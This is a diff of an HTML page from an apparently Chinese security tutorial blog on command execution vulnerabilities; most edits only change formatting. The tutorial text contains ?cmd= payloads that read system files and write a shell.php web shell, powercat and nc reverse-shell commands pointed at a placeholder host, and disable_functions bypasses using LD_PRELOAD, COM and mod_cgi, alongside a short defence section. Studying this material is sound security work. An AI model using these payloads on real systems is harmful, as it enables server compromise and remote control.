@@ -45,7 +45,7 @@
         content="2021-08-05">
       <meta 
         property="og:article:modified_time" 
-        content="2021-08-12">
+        content="2021-08-16">
       <meta 
         property="og:article:author" 
         content="沉墨">
@@ -346,8 +346,8 @@
 <td align="left">打开并运行一个程序文件，返回一个文件指针</td>
 </tr>
 <tr>
-<td align="left">反引号（``）</td>
-<td align="left">反引号[``]内的字符串，也会被解析成OS命令</td>
+<td align="left">反引号<code>(``)、[``]</code>内的字符串，也会被解析成OS命令</td>
+<td align="left"></td>
 </tr>
 </tbody></table>
 <h1 id="二、命令执行漏洞的危害"><a href="#二、命令执行漏洞的危害" class="headerlink" title="二、命令执行漏洞的危害"></a>二、命令执行漏洞的危害</h1><p>1、继承Web服务器程序权限（Web用户权限），去执行系统命令</p>
@@ -365,7 +365,7 @@
 </thead>
 <tbody><tr>
 <td align="left">查看系统文件</td>
-<td align="left">payload：[?cmd=typec:\windows\system32\drivers\etc\hosts] 查看系统hosts文件</td>
+<td align="left">payload：[?cmd=type c:\windows\system32\drivers\etc\hosts] 查看系统hosts文件</td>
 </tr>
 <tr>
 <td align="left">显示当前路径</td>
@@ -377,7 +377,7 @@
 </tr>
 <tr>
 <td align="left">写文件</td>
-<td align="left">payload：[?cmd=echo”“&gt;C:\phpStudy\WWW\Commmandi\shell.php] 页面没有报错，说明文件写入成功</td>
+<td align="left">payload：[?cmd=echo”x” &gt; C:\phpStudy\WWW\Commmand\shell.php] 页面没有报错，说明文件写入成功</td>
 </tr>
 </tbody></table>
 <h1 id="三、命令执行语法"><a href="#三、命令执行语法" class="headerlink" title="三、命令执行语法"></a>三、命令执行语法</h1><p>Windows</p>
@@ -435,18 +435,18 @@
 </tr>
 <tr>
 <td align="left">command1.<code>command2</code></td>
-<td align="left">反引号(“``”)，优先执行,无论command1是否执行成功</td>
+<td align="left">反引号<code>&quot; `` &quot;</code>，优先执行,无论command1是否执行成功</td>
 </tr>
 </tbody></table>
 <h1 id="四、命令执行漏洞的防御"><a href="#四、命令执行漏洞的防御" class="headerlink" title="四、命令执行漏洞的防御"></a>四、命令执行漏洞的防御</h1><p>1、尽量少使用执行命令函数或者禁用disable_functions</p>
 <p>2、在进入执行命令的函数之前，对参数进行过滤，对敏感字符进行转义</p>
 <p>3、参数值尽量使用引号包括，并在拼接前调用addslashes进行转义</p>
 <p>注：windows写入用单引号，linux用双引号。</p>
-<h1 id="五、反弹shell"><a href="#五、反弹shell" class="headerlink" title="五、反弹shell"></a>五、反弹shell</h1><p>正向shell–不可控，但是不受网络环境影响（自己内网连接目标公网）</p>
+<h1 id="五、反弹shell"><a href="#五、反弹shell" class="headerlink" title="五、反弹shell"></a>五、反弹shell</h1><p>正向shell不可控，但是不受网络环境影响（自己内网连接目标公网）</p>
 <p>控制端-&gt;被控端，被控端需要开启监听（被控端防火墙、端口开启等难度大，不建议）</p>
 <pre class="highlight"><span class="line">powercat -l -p 8888 -e cmd</span><br><span class="line"></span><br><span class="line">nc x.x.x.x 8888</span><br></pre>
 
-<p>反弹shel–可控，但是需要网络可达（目标内网连接自己公网）</p>
+<p>反弹shel可控，但是需要网络可达（目标内网连接自己公网）</p>
 <p>被控端-&gt;控制端，控制端开启监听可控，被控端只需要连接即可，容易实现</p>
 <p>注：无论是哪种shell，都是控制端控制被控端。</p>
 <pre class="highlight"><span class="line">powercat -c x.x.x.x -p 8888 -e cmd</span><br><span class="line"></span><br><span class="line">nc -lnvp 8888</span><br></pre>
@@ -473,11 +473,11 @@
 </tr>
 </thead>
 <tbody><tr>
-<td align="left">常规绕过： exec,shell_exec,system,passthru,popen,proc_open</td>
+<td align="left">常规绕过： <br>exec,shell_exec,system,passthru,popen,proc_open</td>
 <td align="left">黑名单不全绕过 （蚁剑自带黑名单绕过）</td>
 </tr>
 <tr>
-<td align="left">利用环境变量LD_PRELOAD绕过（重要） LD_PRELOAD是Linux系统的下的一个环境变量，它允许你定义在程序运行前优先加载的动态链接库。 通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。 在php中，可使用putenv()函数设置LD_PRELOAD环境变量来加载指定的so文件，so文件中包含自定义函数进行劫持从而达到执行恶意命令的目的</td>
+<td align="left">利用环境变量LD_PRELOAD绕过 <br>LD_PRELOAD是Linux系统的下的一个环境变量，它允许你定义在程序运行前优先加载的动态链接库。 通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。 在php中，可使用putenv()函数设置LD_PRELOAD环境变量来加载指定的so文件，so文件中包含自定义函数进行劫持从而达到执行恶意命令的目的</td>
 <td align="left">前提条件 <br>1、能够上传自己的.so文件 <br>2、能够控制环境变量的值（设置LD_PRELOAD变量），比如putenv函数 <br>3、存在mail()、imap_mail()、mb_send_mail()和error_log()等可以控制PHP启动外部程序并能执行的函数  <br><br>利用过程 <br>1、首先，能够上传恶意.so文件，.so文件由攻击者在本地使用与服务端相近的系统环境进行编译，该库中重写了相关系统函数，重写的系统函数能够被PHP中未被disable_functions禁止的函数所调用 <br>2、能够设置环境变量，比如putenv函数未被禁止，就可以把LD_PRELOAD变量设置为恶意.so文件的路径，只要启动新的进程就会在新进程运行前优先加载该恶意.so文件，导致恶意代码就被注入到程序中 <br>3、当执行未被禁止的PHP函数，并且该函数调用了恶意库中重写的系统函数，就可以达到任意执行系统命令的效果了，因为重写的系统函数中的内容是我们可控的，对这部分内容进行编程即可</td>
 </tr>
 <tr>
@@ -489,11 +489,11 @@
 <td align="left"></td>
 </tr>
 <tr>
-<td align="left">利用系统组件window com绕过 COM组件它最早的设计意图是，跨语言实现程序组件的复用 COM组件由以Win32动态连接库（DLL）或可执行文件（EXE）形式发布的可执行代码所组成，遵循COM规范编写出来的组件将能够满足对组件架构的所有要求</td>
-<td align="left">前提条件 <br>1、php版本为5.4，高版本扩展要自己添加 <br>2、要在php.ini中开启extension=php_com_dotnet.dll 函数： <br>exec(“cmd /c”.$command); <br>$stdout = $exec-&gt;StdOut(); $stringput = $stdout-&gt;ReadALL(); <br>print($stringput); ?&gt; <br><br>使用： <br>com.php?shell=whoami</td>
+<td align="left">利用系统组件window com绕过 <br>COM组件它最早的设计意图是，跨语言实现程序组件的复用 COM组件由以Win32动态连接库（DLL）或可执行文件（EXE）形式发布的可执行代码所组成，遵循COM规范编写出来的组件将能够满足对组件架构的所有要求</td>
+<td align="left">前提条件 <br>1、php版本为5.4，高版本扩展要自己添加 <br>2、要在php.ini中开启extension=php_com_dotnet.dll 函数： <br>exec(“cmd /c”.$command); <br>$stdout = $exec-&gt;StdOut(); <br>$stringput = $stdout-&gt;ReadALL(); <br>print($stringput); ?&gt; <br><br>使用： <br>com.php?shell=whoami</td>
 </tr>
 <tr>
-<td align="left">利用Apache+mod_cgi+.htaccess绕过 ModCGI把PHP做为APACHE一个内置模块，让apachehttp服务器本身能够支持PHP语言，不需要每一个请求都通过启动PHP解释器来解释PHP，它可以将cgi-script文件或者用户自定义标识头为cgi-script的文件通过服务器运行。 .htaccess文件中可以定制用户定义标识头，如果添加Options+ExecCGI，代表着允许使用mod_cgi模块执行CGI脚本，添加AddHandlercgi-script.cgi，代表着包含.cgi扩展名的文件都将被视为CGI程序</td>
+<td align="left">利用Apache+mod_cgi+.htaccess绕过 ModCGI把PHP做为APACHE一个内置模块，让apache http服务器本身能够支持PHP语言，不需要每一个请求都通过启动PHP解释器来解释PHP，它可以将cgi-script文件或者用户自定义标识头为cgi-script的文件通过服务器运行。 .htaccess文件中可以定制用户定义标识头，如果添加Options+ExecCGI，代表着允许使用mod_cgi模块执行CGI脚本，添加AddHandlercgi-script.cgi，代表着包含.cgi扩展名的文件都将被视为CGI程序</td>
 <td align="left">前提条件 <br>1、启用mod-cgi <br>2、.htaccess可写 <br>3、保证.htaccess可以加载进当前web环境。当apache配置文件中指定web目录下AllowOverride参数值为None时，.htaccess文件无法生效</td>
 </tr>
 <tr>
@@ -751,13 +751,6 @@
         </div>
       </a>
     
-      <a href="/categories/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/">
-        <div class="categories-list-item">
-          网络基础
-          <span class="categories-list-item-badge">2</span>
-        </div>
-      </a>
-    
       <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
         <div class="categories-list-item">
           漏洞复现
@@ -776,6 +769,13 @@
         <div class="categories-list-item">
           环境搭建
           <span class="categories-list-item-badge">7</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/">
+        <div class="categories-list-item">
+          网络基础
+          <span class="categories-list-item-badge">2</span>
         </div>
       </a>
     
@@ -857,12 +857,6 @@
       </a>
     
       <a 
-        href="/tags/%E5%8D%9A%E5%AE%A2/" 
-        title="博客">
-        <div class="tags-list-item">博客</div>
-      </a>
-    
-      <a 
         href="/tags/%E7%9B%B4%E6%92%AD%E6%8E%A8%E6%B5%81/" 
         title="直播推流">
         <div class="tags-list-item">直播推流</div>
@@ -875,21 +869,27 @@
       </a>
     
       <a 
+        href="/tags/%E5%8D%9A%E5%AE%A2/" 
+        title="博客">
+        <div class="tags-list-item">博客</div>
+      </a>
+    
+      <a 
         href="/tags/Apache/" 
         title="Apache">
         <div class="tags-list-item">Apache</div>
       </a>
     
       <a 
-        href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" 
-        title="命令执行">
-        <div class="tags-list-item">命令执行</div>
-      </a>
-    
-      <a 
         href="/tags/%E5%8F%8D%E5%BC%B9shell/" 
         title="反弹shell">
         <div class="tags-list-item">反弹shell</div>
+      </a>
+    
+      <a 
+        href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" 
+        title="命令执行">
+        <div class="tags-list-item">命令执行</div>
       </a>
     
       <a 
